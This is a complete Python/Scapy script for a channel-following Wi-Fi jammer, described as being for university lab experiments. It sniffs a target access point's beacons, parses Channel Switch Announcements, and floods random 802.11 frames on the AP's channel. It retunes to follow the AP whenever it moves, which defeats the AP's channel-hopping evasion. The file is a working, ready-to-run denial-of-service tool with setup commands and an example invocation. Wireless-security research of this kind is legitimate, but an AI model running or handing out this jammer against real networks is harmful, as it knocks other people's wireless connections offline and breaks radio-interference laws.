#!/usr/bin/env python3
"""Single-node CSA-following packet-injection jammer for controlled lab tests.

This script uses one monitor-mode interface for both tasks:
  1. sniff target AP beacons and parse Channel Switch Announcement (CSA) IEs;
  2. inject random 802.11 frames on the current channel using Scapy.

When a CSA beacon indicates that the target AP is about to move channels, the
script schedules the local transmitter to stop, retunes the same monitor
interface to the CSA target channel, and restarts injection on the new channel.

Intended use: ECE436/NITLab controlled experiments on owned lab nodes only.
Do not run against networks you do not own or have permission to test.

Prerequisites on the jammer node:
  apt install -y python3-scapy iw
  ip link set wlan0 down 2>/dev/null || true
  iw dev wlan0 interface add mon1 type monitor
  ip link set mon1 up

Example:
  ./csa_follow_jammer.py \
      --monitor-iface mon1 \
      --initial-channel 1 \
      --target-ssid tsiantos \
      --pps 150 \
      --frame-size 900

If the target AP sends CSA beacons, the jammer estimates the switch time from
CSA count and beacon interval, retunes at the expected switch moment, and keeps
injecting on the new channel.
"""

from __future__ import annotations

import argparse
import os
import random
import signal
import string
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from typing import Iterable, Optional

try:
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Raw, sendp, sniff  # type: ignore
    SCAPY_IMPORT_ERROR = None
except ImportError as exc:  # pragma: no cover - depends on node package state
    Dot11 = Dot11Beacon = Dot11Elt = RadioTap = Raw = sendp = sniff = None  # type: ignore
    SCAPY_IMPORT_ERROR = exc


def now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def log(msg: str, err: bool = False) -> None:
    print(f"[{now()}] {msg}", file=(sys.stderr if err else sys.stdout), flush=True)


def channel_to_freq_mhz(channel: int) -> int:
    if channel == 14:
        return 2484
    if 1 <= channel <= 13:
        return 2407 + 5 * channel
    raise ValueError(f"unsupported 2.4GHz channel: {channel}")


def set_channel(iface: str, channel: int) -> bool:
    proc = subprocess.run(
        ["iw", "dev", iface, "set", "channel", str(channel)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
    )
    if proc.returncode != 0:
        log(f"WARN: failed to set {iface} to channel {channel}: {proc.stderr.strip()}", err=True)
        return False
    return True


def random_mac(local_admin: bool = True) -> str:
    first = random.randint(0, 255)
    if local_admin:
        first = (first | 0x02) & 0xFE
    octets = [first] + [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in octets)


def dot11elt_iter(pkt) -> Iterable:
    elt = pkt.getlayer(Dot11Elt)
    while elt is not None:
        yield elt
        elt = elt.payload.getlayer(Dot11Elt)


def beacon_ssid(pkt) -> str:
    for elt in dot11elt_iter(pkt):
        if getattr(elt, "ID", None) == 0:
            raw = bytes(getattr(elt, "info", b"") or b"")
            return raw.decode("utf-8", "ignore")
    return ""


def beacon_current_channel(pkt, fallback: int) -> int:
    """Return DS Parameter Set or HT Operation primary channel if available."""
    ds_channel = None
    ht_primary = None
    for elt in dot11elt_iter(pkt):
        eid = getattr(elt, "ID", None)
        data = bytes(getattr(elt, "info", b"") or b"")
        if eid == 3 and data:
            ch = int(data[0])
            if 1 <= ch <= 14:
                ds_channel = ch
        elif eid == 61 and data:
            ch = int(data[0])
            if 1 <= ch <= 14:
                ht_primary = ch
    return ds_channel or ht_primary or fallback


@dataclass
class CsaInfo:
    channel: Optional[int] = None
    count: Optional[int] = None
    mode: Optional[int] = None
    ext_channel: Optional[int] = None
    ext_count: Optional[int] = None
    ext_mode: Optional[int] = None
    ext_op_class: Optional[int] = None
    raw_csa: Optional[str] = None
    raw_ext_csa: Optional[str] = None

    def has_switch(self) -> bool:
        return self.channel is not None or self.ext_channel is not None

    def target_channel(self) -> Optional[int]:
        return self.channel if self.channel is not None else self.ext_channel

    def switch_count(self) -> Optional[int]:
        return self.count if self.count is not None else self.ext_count

    def to_dict(self) -> dict:
        return {
            "channel": self.channel,
            "count": self.count,
            "mode": self.mode,
            "ext_channel": self.ext_channel,
            "ext_count": self.ext_count,
            "ext_mode": self.ext_mode,
            "ext_op_class": self.ext_op_class,
            "raw_csa": self.raw_csa,
            "raw_ext_csa": self.raw_ext_csa,
        }


def parse_csa(pkt) -> CsaInfo:
    """Parse Channel Switch Announcement IE 37 and Extended CSA IE 60.

    IE 37 format: mode, new_channel, count.
    IE 60 format: mode, new_operating_class, new_channel, count.
    """
    csa = CsaInfo()
    for elt in dot11elt_iter(pkt):
        eid = getattr(elt, "ID", None)
        data = bytes(getattr(elt, "info", b"") or b"")
        if eid == 37:
            csa.raw_csa = data.hex()
            if len(data) >= 3:
                csa.mode = int(data[0])
                ch = int(data[1])
                csa.count = int(data[2])
                if 1 <= ch <= 14:
                    csa.channel = ch
        elif eid == 60:
            csa.raw_ext_csa = data.hex()
            if len(data) >= 4:
                csa.ext_mode = int(data[0])
                csa.ext_op_class = int(data[1])
                ch = int(data[2])
                csa.ext_count = int(data[3])
                if 1 <= ch <= 14:
                    csa.ext_channel = ch
    return csa


def beacon_interval_seconds(pkt, default_tu: int) -> float:
    """Return beacon interval in seconds.

    Scapy exposes Dot11Beacon.beacon_interval in TUs. 1 TU = 1024 us.
    """
    try:
        tu = int(pkt[Dot11Beacon].beacon_interval)  # type: ignore[index]
    except Exception:
        tu = default_tu
    if tu <= 0:
        tu = default_tu
    return tu * 1024.0 / 1_000_000.0


@dataclass
class CsaHit:
    target_channel: int
    current_channel: int
    count: Optional[int]
    beacon_interval_s: float
    bssid: str
    ssid: str
    rssi: Optional[int]
    csa: CsaInfo


class RandomFrameInjector:
    def __init__(self, args: argparse.Namespace, stop_event: threading.Event) -> None:
        assert RadioTap is not None and Dot11 is not None and Raw is not None and sendp is not None
        self.args = args
        self.stop_event = stop_event
        self.thread: Optional[threading.Thread] = None
        self.tx_stop = threading.Event()
        self.sent = 0
        self.current_channel = args.initial_channel
        self.src_mac = args.src_mac if args.src_mac != "random" else random_mac()
        self.bssid = args.bssid if args.bssid != "random" else random_mac()

    def build_frame(self):
        dst = self.args.dst_mac
        src = self.src_mac if not self.args.randomize_src else random_mac()
        bssid = self.bssid
        header_len_guess = 64
        payload_len = max(0, self.args.frame_size - header_len_guess)
        if self.args.random_payload:
            payload = os.urandom(payload_len)
        else:
            alphabet = (string.ascii_letters + string.digits).encode("ascii")
            payload = bytes(random.choice(alphabet) for _ in range(payload_len))

        # To-DS data frame: addr1=BSSID/AP, addr2=transmitter STA, addr3=final destination.
        # In monitor injection mode there is no real association; these frames are intended
        # to consume airtime in a controlled lab, not to deliver IP data.
        radiotap_cls = RadioTap
        dot11_cls = Dot11
        raw_cls = Raw
        assert radiotap_cls is not None and dot11_cls is not None and raw_cls is not None
        return radiotap_cls() / dot11_cls(type=2, subtype=0, FCfield="to-DS", addr1=bssid, addr2=src, addr3=dst) / raw_cls(payload)

    def _loop(self) -> None:
        interval = 1.0 / self.args.pps if self.args.pps > 0 else 0.0
        log(f"TX loop started iface={self.args.monitor_iface} pps={self.args.pps} frame_size={self.args.frame_size} src={self.src_mac} bssid={self.bssid} dst={self.args.dst_mac}")
        while not self.stop_event.is_set() and not self.tx_stop.is_set():
            frame = self.build_frame()
            if self.args.dry_run:
                self.sent += 1
            else:
                try:
                    sendp_fn = sendp
                    assert sendp_fn is not None
                    sendp_fn(frame, iface=self.args.monitor_iface, verbose=False)
                    self.sent += 1
                except Exception as exc:
                    log(f"WARN: sendp failed: {exc}", err=True)
                    time.sleep(0.2)
            if interval > 0:
                time.sleep(interval)
        log(f"TX loop stopped sent={self.sent}")

    def start(self) -> None:
        if self.thread is not None and self.thread.is_alive():
            return
        self.tx_stop.clear()
        self.thread = threading.Thread(target=self._loop, name="random-frame-injector", daemon=True)
        self.thread.start()

    def stop(self, timeout: float = 2.0) -> None:
        self.tx_stop.set()
        if self.thread is not None:
            self.thread.join(timeout=timeout)
        self.thread = None


class CsaFollowingJammer:
    def __init__(self, args: argparse.Namespace) -> None:
        assert Dot11 is not None and Dot11Beacon is not None and sniff is not None
        self.args = args
        self.stop_event = threading.Event()
        self.injector = RandomFrameInjector(args, self.stop_event)
        self.current_channel = args.initial_channel
        self.pending_target: Optional[int] = None
        self.pending_timer: Optional[threading.Timer] = None
        self.pending_lock = threading.Lock()
        self.last_switch_time = 0.0

        self.target_bssid = args.target_bssid.lower() if args.target_bssid else None
        self.ignore_bssids = {b.lower() for b in args.ignore_bssid}
        self.target_ssid = args.target_ssid
        self.ignore_ssids = set(args.ignore_ssid)

        self.packet_count = 0
        self.beacon_count = 0
        self.target_beacon_count = 0
        self.csa_beacon_count = 0
        self.logged_target_samples = 0
        self.last_stats_time = time.time()

    def stop(self) -> None:
        self.stop_event.set()
        if self.pending_timer is not None:
            self.pending_timer.cancel()
        self.injector.stop()

    def maybe_log_stats(self) -> None:
        now_ts = time.time()
        if self.args.stats_interval > 0 and now_ts - self.last_stats_time >= self.args.stats_interval:
            log(
                "stats packets=%s beacons=%s target_beacons=%s csa_beacons=%s current_channel=%s pending_target=%s tx_sent=%s"
                % (
                    self.packet_count,
                    self.beacon_count,
                    self.target_beacon_count,
                    self.csa_beacon_count,
                    self.current_channel,
                    self.pending_target,
                    self.injector.sent,
                )
            )
            self.last_stats_time = now_ts

    def packet_matches(self, pkt) -> Optional[CsaHit]:
        self.packet_count += 1
        self.maybe_log_stats()
        if not pkt.haslayer(Dot11Beacon):
            return None
        self.beacon_count += 1
        dot11 = pkt.getlayer(Dot11)
        bssid = (getattr(dot11, "addr2", None) or "").lower()
        if not bssid:
            return None
        ssid = beacon_ssid(pkt)

        if bssid in self.ignore_bssids:
            return None
        if ssid in self.ignore_ssids:
            return None
        if self.target_bssid and bssid != self.target_bssid:
            return None
        if self.target_ssid is not None and ssid != self.target_ssid:
            return None

        self.target_beacon_count += 1
        rssi = getattr(pkt, "dBm_AntSignal", None)
        current_channel = beacon_current_channel(pkt, self.current_channel)
        csa = parse_csa(pkt)
        if self.logged_target_samples < self.args.target_beacon_samples:
            log(
                "target beacon sample ssid=%r bssid=%s current_channel=%s rssi=%s csa_present=%s csa=%s"
                % (ssid, bssid, current_channel, rssi, csa.has_switch(), csa.to_dict())
            )
            self.logged_target_samples += 1

        if not csa.has_switch():
            return None
        self.csa_beacon_count += 1
        target_channel = csa.target_channel()
        if target_channel is None:
            log(f"CSA beacon had no valid 2.4GHz target channel: ssid={ssid!r} bssid={bssid} csa={csa.to_dict()}", err=True)
            return None
        count = csa.switch_count()
        return CsaHit(
            target_channel=target_channel,
            current_channel=current_channel,
            count=count,
            beacon_interval_s=beacon_interval_seconds(pkt, self.args.default_beacon_interval_tu),
            bssid=bssid,
            ssid=ssid,
            rssi=rssi,
            csa=csa,
        )

    def switch_delay_for_hit(self, hit: CsaHit) -> float:
        if self.args.switch_strategy == "immediate":
            return 0.0
        if self.args.switch_strategy == "threshold":
            if hit.count is not None and hit.count > self.args.switch_at_count:
                return -1.0
            return 0.0

        # countdown strategy: estimate when the AP will switch from CSA count and
        # beacon interval. Subtract a small guard so we retune just before/around
        # the target's actual switch time. If count is absent, switch immediately.
        if hit.count is None:
            return 0.0
        effective_count = max(0, hit.count - self.args.switch_at_count)
        delay = effective_count * hit.beacon_interval_s - self.args.switch_guard
        return max(0.0, delay)

    def schedule_switch(self, hit: CsaHit) -> None:
        now_ts = time.time()
        if hit.target_channel == self.current_channel and not self.args.switch_same_channel:
            log(f"CSA target is already current channel {self.current_channel}; ignoring csa={hit.csa.to_dict()}")
            return
        if now_ts - self.last_switch_time < self.args.min_switch_interval:
            log(f"suppress switch to {hit.target_channel}; min interval not elapsed")
            return
        delay = self.switch_delay_for_hit(hit)
        if delay < 0:
            log(
                f"CSA seen but count={hit.count} is above threshold={self.args.switch_at_count}; waiting for later beacon target_channel={hit.target_channel}"
            )
            return

        with self.pending_lock:
            if self.pending_target == hit.target_channel and self.pending_timer is not None:
                # A later CSA beacon for the same target gives a better countdown.
                self.pending_timer.cancel()
            elif self.pending_timer is not None:
                self.pending_timer.cancel()

            self.pending_target = hit.target_channel
            log(
                "CSA beacon: ssid=%r bssid=%s current_channel=%s target_channel=%s count=%s beacon_interval=%.3fs delay=%.3fs rssi=%s csa=%s"
                % (
                    hit.ssid,
                    hit.bssid,
                    hit.current_channel,
                    hit.target_channel,
                    hit.count,
                    hit.beacon_interval_s,
                    delay,
                    hit.rssi,
                    hit.csa.to_dict(),
                )
            )
            self.pending_timer = threading.Timer(delay, self.perform_switch, args=(hit.target_channel,))
            self.pending_timer.daemon = True
            self.pending_timer.start()

    def perform_switch(self, target_channel: int) -> None:
        with self.pending_lock:
            if self.stop_event.is_set():
                return
            log(f"switching local jammer iface={self.args.monitor_iface} {self.current_channel} -> {target_channel}")
            self.injector.stop(timeout=self.args.tx_stop_timeout)
            if self.args.switch_pause > 0:
                time.sleep(self.args.switch_pause)
            ok = True if self.args.dry_run else set_channel(self.args.monitor_iface, target_channel)
            if not ok:
                log(f"local channel switch failed; restarting TX on old channel {self.current_channel}", err=True)
                self.injector.start()
                self.pending_target = None
                self.pending_timer = None
                return
            self.current_channel = target_channel
            self.injector.current_channel = target_channel
            self.last_switch_time = time.time()
            self.pending_target = None
            self.pending_timer = None
            if self.args.post_switch_pause > 0:
                time.sleep(self.args.post_switch_pause)
            if not self.args.no_tx:
                self.injector.start()
            log(f"local jammer now following channel {target_channel}")
            if self.args.once:
                self.stop_event.set()

    def run(self) -> None:
        if self.args.set_channel:
            if not set_channel(self.args.monitor_iface, self.args.initial_channel):
                if self.args.require_set_channel:
                    raise SystemExit(1)
                log("WARN: continuing even though initial channel set failed", err=True)
        log(
            "starting CSA-following jammer iface=%s initial_channel=%s target_ssid=%r target_bssid=%r dry_run=%s"
            % (self.args.monitor_iface, self.args.initial_channel, self.target_ssid, self.target_bssid, self.args.dry_run)
        )
        if not self.args.no_tx:
            self.injector.start()

        def handler(pkt) -> None:
            hit = self.packet_matches(pkt)
            if hit is not None:
                self.schedule_switch(hit)

        try:
            sniff_fn = sniff
            assert sniff_fn is not None
            sniff_fn(
                iface=self.args.monitor_iface,
                prn=handler,
                timeout=self.args.timeout if self.args.timeout > 0 else None,
                store=False,
                stop_filter=lambda _pkt: self.stop_event.is_set(),
            )
        except KeyboardInterrupt:
            log("stopping CSA-following jammer")
        finally:
            self.stop()


def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Single-monitor-interface CSA-following Scapy packet injector for controlled lab tests.")
    p.add_argument("--monitor-iface", default="mon1", help="monitor-mode interface used for sniffing and packet injection")
    p.add_argument("--initial-channel", type=int, default=1, help="initial 2.4GHz channel for monitor iface")
    p.add_argument("--set-channel", action="store_true", default=True, help="set monitor iface to --initial-channel before starting (default)")
    p.add_argument("--no-set-channel", action="store_false", dest="set_channel", help="do not set initial channel")
    p.add_argument("--require-set-channel", action="store_true", help="exit if initial channel set fails")

    p.add_argument("--target-ssid", help="only follow CSA beacons from this SSID; omit to follow any non-ignored CSA beacon")
    p.add_argument("--target-bssid", help="only follow CSA beacons from this BSSID")
    p.add_argument("--ignore-ssid", action="append", default=[], help="SSID to ignore; may be repeated")
    p.add_argument("--ignore-bssid", action="append", default=[], help="BSSID to ignore; may be repeated")

    p.add_argument("--pps", type=float, default=100.0, help="injected frames per second")
    p.add_argument("--frame-size", type=int, default=900, help="approximate injected 802.11 frame size in bytes")
    p.add_argument("--dst-mac", default="ff:ff:ff:ff:ff:ff", help="addr3/final destination in injected frames")
    p.add_argument("--src-mac", default="random", help="addr2/transmitter MAC, or 'random' once at startup")
    p.add_argument("--bssid", default="random", help="addr1/BSSID MAC, or 'random' once at startup")
    p.add_argument("--randomize-src", action="store_true", help="randomize transmitter MAC for every injected frame")
    p.add_argument("--random-payload", action="store_true", default=True, help="use random bytes as frame payload (default)")
    p.add_argument("--no-random-payload", action="store_false", dest="random_payload", help="use printable pseudo-random payload bytes")
    p.add_argument("--no-tx", action="store_true", help="sniff/follow only; do not inject packets")

    p.add_argument("--switch-strategy", choices=["countdown", "threshold", "immediate"], default="countdown", help="when to retune after seeing CSA")
    p.add_argument("--switch-at-count", type=int, default=1, help="CSA count threshold/offset used by countdown and threshold strategies")
    p.add_argument("--switch-guard", type=float, default=0.02, help="seconds subtracted from countdown estimate so retune happens slightly early")
    p.add_argument("--switch-pause", type=float, default=0.05, help="seconds to wait after stopping TX before retuning")
    p.add_argument("--post-switch-pause", type=float, default=0.05, help="seconds to wait after retuning before restarting TX")
    p.add_argument("--tx-stop-timeout", type=float, default=2.0, help="seconds to wait for TX thread to stop")
    p.add_argument("--min-switch-interval", type=float, default=1.0, help="minimum seconds between local channel switches")
    p.add_argument("--switch-same-channel", action="store_true", help="run the switch sequence even when CSA target equals current channel")
    p.add_argument("--default-beacon-interval-tu", type=int, default=100, help="fallback beacon interval in TUs if missing from beacon")

    p.add_argument("--timeout", type=float, default=0.0, help="seconds to run; 0 means forever")
    p.add_argument("--once", action="store_true", help="exit after first successful local channel switch")
    p.add_argument("--dry-run", action="store_true", help="parse/schedule/log but do not inject or retune")
    p.add_argument("--stats-interval", type=float, default=5.0, help="seconds between counter log lines; 0 disables")
    p.add_argument("--target-beacon-samples", type=int, default=10, help="number of matching target beacons to log even without CSA")
    return p


def validate_args(args: argparse.Namespace) -> Optional[str]:
    if not (1 <= args.initial_channel <= 14):
        return "--initial-channel must be a 2.4GHz channel 1-14"
    if args.pps <= 0 and not args.no_tx:
        return "--pps must be positive unless --no-tx is used"
    if args.frame_size < 80:
        return "--frame-size must be at least 80 bytes"
    if args.switch_at_count < 0:
        return "--switch-at-count must be >= 0"
    for name in ("switch_guard", "switch_pause", "post_switch_pause", "tx_stop_timeout", "min_switch_interval", "timeout", "stats_interval"):
        if getattr(args, name) < 0:
            return f"--{name.replace('_', '-')} must be >= 0"
    if args.default_beacon_interval_tu <= 0:
        return "--default-beacon-interval-tu must be positive"
    return None


def main() -> int:
    args = build_arg_parser().parse_args()
    err = validate_args(args)
    if err:
        print(f"ERROR: {err}", file=sys.stderr)
        return 2
    if SCAPY_IMPORT_ERROR is not None:
        print("ERROR: scapy is not installed. Run: apt install python3-scapy -y", file=sys.stderr)
        return 2

    jammer = CsaFollowingJammer(args)

    def _handle_signal(_signum, _frame) -> None:
        log("received signal, stopping")
        jammer.stop()

    signal.signal(signal.SIGTERM, _handle_signal)
    signal.signal(signal.SIGINT, _handle_signal)
    jammer.run()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
